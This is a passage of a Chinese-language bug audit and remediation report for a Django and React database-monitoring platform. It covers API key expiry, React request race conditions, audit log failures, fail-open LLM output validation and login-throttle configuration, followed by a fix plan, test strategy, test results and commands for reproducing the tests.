**(a)** `APIKeyAuth.CACHE_TIMEOUT = 300`，且 `generate_api_key` 用它作为
`cache.set` 的 `timeout`。API Key 生成 5 分钟后即失效——作为"外部系统集成"凭证毫无意义。
且仅存于缓存，Redis 重启即全部失效。

**(b)** `tenancy.py` 定义了完整的多租户隔离逻辑，**全项目零引用**
（`grep -rn "tenancy" --include="*.py"` 仅命中自身）。

**修复**
(a) 拆分两个常量，Key 有效期独立可配，并落库持久化（新增 `ApiKey` 模型）：
```python
API_KEY_TTL_SEC = int(getattr(settings, 'API_KEY_TTL_SEC', 90 * 86400))
CACHE_TIMEOUT = 300      # 仅作为查库结果的缓存时长
```
本轮先做**最小修复**：把 `generate_api_key` 的 timeout 改为 `API_KEY_TTL_SEC`，
并在类文档中标注「当前基于缓存，Redis 重启后失效；持久化列入后续迭代」。

(b) `tenancy.py` 顶部加显式标注，避免后人误以为多租户已生效：
```python
"""⚠️ 当前版本未接入：本模块定义的租户隔离尚未在任何 API 路径中启用。
   数据范围隔离目前由 auth.get_user_database_ids() 承担。
   接入计划见 DB_AIOps_MASTER_DESIGN.md。"""
```

**验证** 单测：`generate_api_key` 后立即 `validate_api_key` 成功；断言 `cache.set` 的 timeout > 300。

---

## BUG-133 性能中心 effect 无竞态保护

**定位** `frontend/src/pages/PerformanceCenter.jsx:51-60`、`components/perf/tabs/HomeTab.jsx:21-37`、
`BlockingTab.jsx:24-39`、`AshTab/SqlTab/TopActivityTab` 同类写法

```jsx
useEffect(() => {
  perfAPI.aas(configId, {...range}).then(r => setAas(r.data))
}, [configId, range, refreshKey])
```

无 cleanup、无 AbortController。开启 10s 自动刷新（`PerformanceCenter.jsx:64`）
并快速切换时间窗时，慢的旧请求会在新请求之后返回，**用旧数据覆盖新数据**。
用户切到「30分钟」，图表却显示「7天」的数据。

**修复** 统一的 cancel-token 模式：
```jsx
useEffect(() => {
  if (!configId) return undefined;
  let alive = true;
  setLoading(true);
  perfAPI.aas(configId, { ...range, by: 'wait_class' })
    .then((r) => { if (alive) setAas(r.data); })
    .catch((e) => { if (alive) message.error(fmtPerfError('AAS 加载', e)); })
    .finally(() => { if (alive) setLoading(false); });
  return () => { alive = false; };
}, [configId, range, refreshKey]);
```
抽出 `frontend/src/components/perf/useSafeAsync.js` 供五个 Tab 复用。

**验证** 前端单测：先发起慢请求再发起快请求，慢请求后返回 → state 保持快请求的结果。

---

## BUG-134 `flush_expired_aggregations` 不可达分支

**定位** `monitor/alert_manager.py:526-535`

```python
if len(buffered) >= MIN or (buffered and elapsed >= WINDOW):
    ...
elif buffered and elapsed >= WINDOW:      # ← 永远为 False（已被 if 的右半覆盖）
    ...
```
两个分支体完全相同。随 BUG-115 一并删除。

**验证** 覆盖率报告中该分支不再存在。

---

## BUG-135 数据库列表仅返回 `is_active=True`

**定位** `monitor/api_views.py:204-206`

```python
configs = DatabaseConfig.objects.filter(id__in=allowed_db_ids, is_active=True)
```

被停用（`is_active=False`）的实例在 `GET /api/v1/databases/` 中完全消失。
后果：
- 前端导航树（`TargetNavigationTree.jsx:62`）看不到停用实例，无法重新启用
- `DatabaseList.jsx` 的「启停监控」开关关掉后，该行**直接从列表消失**，无法恢复

**修复** 默认返回全部，由查询参数控制：
```python
include_inactive = request.GET.get('include_inactive', '1') not in ('0', 'false', 'False')
qs = DatabaseConfig.objects.all() if include_inactive else DatabaseConfig.objects.filter(is_active=True)
if allowed_db_ids is not None:
    qs = qs.filter(id__in=allowed_db_ids)
```
响应中 `is_active` 字段已存在，前端据此灰显即可。
导航树对 `is_active=False` 的节点显示 ⚫ 并禁用「性能中心」菜单项。

**验证** 单测：停用一个实例 → 列表仍返回它且 `is_active=False`；
`?include_inactive=0` → 不返回。

---

# 三补、测试阶段新发现的缺陷

以下三项不在初次静态审计的清单中，是**写完测试、跑起来之后**才暴露的。
记录在此以保持文档与代码一致。

## BUG-136 审计中间件写不进 AuditLog，审计记录静默丢失

**定位** `monitor/middleware.py:107-133`（`AuditLogMiddleware._record_if_needed`）
+ `monitor/models.py` `AuditLog.config`

**发现过程**
BUG-105 的审批用例返回 500 而非预期的 403。追下去发现：中间件为每个写请求建
审计记录，`config_id=self._extract_db_config_id(path)` 对
`/api/v1/auditlogs/{id}/approve/` 这类路径解析不出实例 ID，返回 `None`；
而 `AuditLog.config` 是 NOT NULL —— INSERT 抛 `NotNullViolation`。

**根因与影响**
- 异常被中间件的 `except Exception` 吞掉，**审计记录静默丢失**。
  登录、用户管理、角色配置、工单审批这些最需要留痕的平台级操作，
  恰恰都是解析不出 config_id 的路径 —— 审计追踪（合规特性）大面积为空。
- 在 PostgreSQL 下，失败的 INSERT 会**污染当前事务**，后续查询全部报
  `InFailedSqlTransaction`。生产环境若开启 `ATOMIC_REQUESTS`，
  整个请求会 500；测试环境（TestCase 包在事务里）必然 500。

**修复**
1. `AuditLog.config` 改为 `null=True, blank=True` —— 平台级操作本就没有关联实例
   （迁移 `0021` 之前的 `0020_auditlog_config_nullable`）
2. 中间件的写入包进 `transaction.atomic()` 保存点：即便写失败也只回滚保存点，
   不污染外层事务

**验证** 见 `tests_bugfix.Bug105AuditWorkflowTests`（修复前整类用例 500）。

---

## BUG-137 jsonschema 缺失时静默跳过 LLM 输出校验（fail-open）

**定位** `monitor/llm/schemas.py:126-136`（`_validate`）

```python
try:
    import jsonschema
    jsonschema.validate(obj, schema)
except ImportError:
    logger.warning("[llm] jsonschema 未安装, 跳过结构校验")   # ← 放行
```

**根因**
`jsonschema` 是 `requirements.txt` 里的硬依赖，但一旦缺失（依赖装漏、精简镜像、
构建缓存问题），**所有 LLM 输出的结构校验被静默跳过并放行**。
而这些输出会驱动 RCA 结论与自动修复预案 —— 安全姿态必须 fail-closed。

**影响**
畸形/被注入的 LLM 响应会直接进入诊断结论与修复方案。
这类缺陷在正常环境下完全不可见（依赖装齐时行为一致），
只有在纯净环境跑测试时才会露头 —— 也正是本次发现它的方式。

**修复** 缺失即抛 `SchemaValidationError`，并给出可操作的排查指引；
保留 `LLM_SCHEMA_VALIDATION_REQUIRED` 开关供特殊场景显式降级（默认 True）。

---

## BUG-138 登录限流阈值在 import 时求值，配置项运行期无效

**定位** `monitor/auth.py`（原 `LOGIN_MAX_ATTEMPTS = getattr(settings, ...)` 等四个模块级常量）

**发现过程**
BUG-106 的用例用 `override_settings(LOGIN_MAX_ATTEMPTS=3)` 收窄阈值，却始终不触发锁定。
原因是这些常量在**模块导入那一刻**就把值固化了。

**影响**
`LOGIN_MAX_ATTEMPTS` / `LOGIN_FAIL_WINDOW_SEC` / `LOGIN_LOCKOUT_SEC` 四个配置项
实际上是"写了但不起作用"的伪配置 —— 运维改了环境变量以为生效，其实要重启进程；
`override_settings` 更是完全无效（测试无法覆盖这条安全逻辑）。
这是 Django 项目里很常见的一类隐形缺陷。

**修复** 改为调用时读取（`_login_max_attempts()` 等四个取值函数）。

**验证** `tests_bugfix.Bug106LoginThrottleTests` 全部依赖 `override_settings` 生效。

---

# 四、实施计划

## 4.1 修复顺序（按依赖关系拓扑排序）

| 批次 | 缺陷 | 理由 |
|------|------|------|
| **B1 基础设施** | BUG-101, 112, 109, 110 | 连接池/超时是其它修复的地基 |
| **B2 权限与安全** | BUG-103, 105, 102, 106, 107, 108, 122 | 安全面必须一次收口，避免半修复 |
| **B3 正确性** | BUG-104, 111, 114, 115, 118, 119, 123, 124, 126, 131 | 数据正确性 |
| **B4 健壮性** | BUG-113, 120, 121, 116, 117, 133 | 异常与降级 |
| **B5 收尾** | BUG-125, 127, 128, 129, 130, 132, 134, 135 | 体验与清理 |

## 4.2 测试策略（三轮全量）

**第 1 轮 — 单元测试**
新增 `monitor/tests_bugfix.py`，每个缺陷至少 1 个「修复前失败、修复后通过」的用例。
目标：新增用例 ≥ 60 个，全部通过；存量 `tests.py` / `tests_phase7.py` / `tests_phase8.py` 零回归。

**第 2 轮 — 并发与集成测试**
新增 `monitor/tests_concurrency.py`：
- 20 线程并发写时序库（BUG-101）
- 10 线程并发执行同一工单（BUG-105）
- 8 线程并发 fire 告警（BUG-115）
- 10 线程并发 capture 计划（BUG-119）

**第 3 轮 — 静态检查与回归**
- `python -m compileall` 全量语法检查
- `manage.py check` + `makemigrations --check --dry-run`
- 前端 `npm run build` 零错误
- 全量重跑第 1、2 轮

## 4.3 回归风险与缓解

| 风险 | 缓解 |
|------|------|
| 连接池改造影响所有时序读写 | 保留 `_get_connection()` 兼容垫片；全部调用点改为上下文管理器并逐一单测 |
| 权限收口后已有用户被挡 | `super_admin` 与 `dba` 默认已有 `metrics.view`/`sql_monitoring.view`；`readonly` 有 `metrics.view` 无 `sql_monitoring.view`（符合预期） |
| 审批人分离影响单人运维 | `AUDIT_REQUIRE_SEPARATE_APPROVER` 开关，默认开启，可关 |
| `UserProfileDatabase` 加外键迁移失败 | 迁移中先清理孤儿行再加约束 |
| 前端权限移除 role 短路 | 服务端对 super_admin 返回全量权限，行为等价；补单测 |

---

# 五、测试执行结果（实测）

环境：Python 3.11 / Django 5.2 / PostgreSQL 16（本地实例）
`TIMESCALEDB_ENABLED=False`、`ES_ENABLED=False`，外部依赖以 mock 注入。

## 5.1 轮次结果

| 轮次 | 内容 | 结果 |
|------|------|------|
| 第 1 轮 | `tests_bugfix.py` 缺陷回归（82 用例） | **82/82 通过** |
| 第 2 轮 | 全量存量测试回归（`tests.py`/`tests_phase7`/`tests_phase8`） | **零回归**，137/137 通过 |
| 第 3 轮 | `tests_concurrency.py` 并发竞态（8 用例） | **8/8 通过** |
| 第 4 轮 | 静态检查 + 前端构建 | `compileall` / `manage.py check` / `makemigrations --check` 全过；`npm run build` 成功 |
| 第 5 轮 | 稳定性：全量 ×3 + 随机顺序 ×3 + 并发套件 ×12 | **全部通过，无 flaky** |

最终全量：**145 个用例，OK**。

## 5.2 测试阶段的三点收获

1. **BUG-119 的第一版修复是不完整的。** 只加 `select_for_update` 时，
   并发用例有约 1/5 概率失败。是这个"偶发失败"逼出了幻读的真正根因，
   最终补上部分唯一索引才彻底解决。**间歇性失败必须追到底，不能重跑掩盖。**
2. **BUG-136 / BUG-138 是被测试用例"撞"出来的**，静态通读没看到 ——
   前者要跑起来才会触发 NOT NULL，后者要 `override_settings` 才暴露。
3. **BUG-137 是在纯净环境下才暴露的**：依赖装齐时行为完全正常，
   只有缺 `jsonschema` 时才显出 fail-open 的危险姿态。

## 5.3 已知遗留（非本次引入）

- `manage.py check --deploy` 仍有 1 项 WARNING（生产部署项，与本次缺陷无关）
- `tenancy.py` 保持未接入状态，已在模块头显著标注（BUG-132）
- `APIKeyAuth` 仍基于缓存存储，Redis 重启后 Key 失效；持久化列入后续迭代（BUG-132）

## 5.4 复现测试的方法

```bash
export POSTGRES_HOST=127.0.0.1 POSTGRES_USER=postgres POSTGRES_PASSWORD=''
export TIMESCALEDB_ENABLED=False ES_ENABLED=False
export DJANGO_SECRET_KEY=test DB_MONITOR_SECRET_KEY=test

python manage.py test monitor                      # 全量 145
python manage.py test monitor.tests_bugfix         # 缺陷回归 82
python manage.py test monitor.tests_concurrency    # 并发竞态 8
python manage.py test monitor --shuffle            # 随机顺序查耦合
```
